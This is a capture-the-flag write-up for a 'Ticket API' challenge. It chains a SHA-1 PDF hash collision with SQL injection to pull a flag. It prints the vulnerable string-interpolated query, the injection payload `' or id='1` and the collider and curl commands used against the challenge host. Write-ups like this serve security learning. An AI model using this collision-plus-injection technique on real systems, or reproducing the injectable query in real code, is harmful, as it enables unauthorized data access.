# WEB/CRYPTO //   👯 Ticket API
 
Built new system to verify forged entry tickets. Hope you like it.

[⬇️ ticket-api_src.zip](./ticket-api_src.zip)

# Writeup

I started with code analysis and found that we had two endpoints which both took a PDF file `/verify` and `/upload`.

When uploaded the file would be parsed as a PDF and it would read any QR codes in the file. Then calculate a `sha1` hash of the QR code and store the QR code value (uuid) and the hash in a database. The value of the QR code had to be a UUID.

The `/verify` endpoint would take the hash and check if it existed in the database, then use the value for the QR code on that PDF to get the row in the database.

```
var ticket = await db.QueryFirstOrDefaultAsync($"SELECT * FROM Tickets WHERE code like '{code}'");
```

If we could manipulate the `code` to be a valid SQL injection instead of an UUID. @decoy then found [this github](https://github.com/nneonneo/sha1collider) with a PDF Sha1 collider. If we could generate two PDF's one with a valiud UUID and one with a SQL payload and make so they have the same sha1 hash we could possible run injections.

I wrote [generatePDF.py](./generatePDF.py) which allowed me to insert a payload and a filename. I generated [ticket-1.pdf](./ticket-1.pdf) with a valid UUID and [ticket-2.pdf](./ticket-2.pdf) which had a SQL payload `' or id='1`. 

Then I ran the `collide.py` script

```bash
$ python collide.py ticket-1.pdf ticket-2.pdf --progressive
$ sha1sum *.pdf 
e1b4f765dc258edbccc3ebb5fc97772feedbda8e  out-ticket-1.pdf
e1b4f765dc258edbccc3ebb5fc97772feedbda8e  out-ticket-2.pdf
2bee794541d908d4f405bdd7a0c011348953cb68  ticket-1.pdf
1308092433161feb3a9d6d9db9b06892533539b5  ticket-2.pdf
```

Bingo, we had two equal sha1 hashes. I uploaded the `ticket-1.pdf`

```bash
$ curl -X POST -F "file=@./out-ticket-1.pdf" https://ticket-api-061f5e195e3d.1753ctf.com/upload
"Ticket added"
```

Followed by verifying the `ticket-2.pdf` which had the SQL payload.

```bash
$ curl -X POST -F "file=@./out-ticket-2.pdf" https://ticket-api-061f5e195e3d.1753ctf.com/verify
{"id":1,"code":"1753c{dizz_are_not_forged_if_they_have_the_same_hasshhh}","hash":"admin-needs-no-hash"}
```